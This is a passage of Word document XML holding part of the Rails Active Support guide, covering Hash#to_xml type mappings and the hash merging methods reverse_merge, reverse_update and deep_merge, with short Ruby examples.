          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> hash as first argument with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:root</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> singularized as second argument. Its return value becomes a new node.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368D47D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="284"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> responds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the method is invoked with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:root</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650945D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="285"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Otherwise, a node with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as tag is created with a string representation of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as text node. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> an attribute “nil” set to “true” is added. Unless the option </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:skip_types</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exists and is true, an attribute “type” is added as well according to the following mapping: </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblInd w:w="720" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="46E0AD9B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FC82670" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>XML_TYPE_NAMES</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= {</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C77636A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "Symbol"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">     </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "symbol",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B2DB358" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "Fixnum"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">     </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "integer",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23462F02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "Bignum"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">     </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "integer",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="568612E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "BigDecimal"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "decimal",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70900414" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "Float"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">      </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "float",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FF95D23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "TrueClass"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "boolean",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C76FAE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "FalseClass"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "boolean",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B836A8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "Date"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">       </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "date",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B9B4A68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "DateTime"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "datetime",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F8277FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "Time"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">       </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "datetime"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B41D04C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3470DD6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default the root node is “hash”, but that’s configurable via the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:root</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EAF7A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The default </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> builder is a fresh instance of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Builder::XmlMarkup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can configure your own builder with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:builder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option. The method also accepts options like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:dasherize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and friends, they are forwarded to the builder.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192AF0AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/conversions.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5FC2C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>11.2 Merging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BF893C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ruby has a built-in method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Hash#merge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that merges two hashes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4750"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="168681AD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A0086D5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.merge(:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 0, :c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11417086" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {:a =&gt; 0, :b =&gt; 1, :c =&gt; 2}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="412977C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Support defines a few more ways of merging hashes that may be convenient.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE4F464" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_merge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_merge!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60809E22" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In case of collision the key in the hash of the argument wins in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>merge</w:t>
      </w:r>
      <w:r>
        <w:t>. You can support option hashes with default values in a compact way with this idiom:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7055"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3604A307" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="413F574B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2030447789"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options = {:length</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 30, :omission</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "..."}.merge(options)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6AEF01A8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_merge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in case you prefer this alternative notation:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7775"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="489CED46" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E1F7A1F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1027364971"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options = options.reverse_merge(:length</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 30, :omission</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "...")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="47477391" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And a bang version </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_merge!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that performs the merge in place:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6695"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1B63D73E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1B29530D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1574970797"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options.reverse_merge!(:length</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 30, :omission</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "...")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60451DDE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Take into account that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_merge!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may change the hash in the caller, which may or may not be a good idea.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5697BE44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/reverse_merge.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166B10C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246F15C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_update</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is an alias for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_merge!</w:t>
      </w:r>
      <w:r>
        <w:t>, explained above.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A366AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>reverse_update</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has no bang.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA716ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/reverse_merge.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74274348" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">11.2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>deep_merge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>deep_merge!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214D2269" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>As you can see in the previous example if a key is found in both hashes the value in the one in the argument wins.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272DD65C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Hash#deep_merge</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. In a deep merge, if a key is found in both hashes and their values are hashes in turn, then their </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
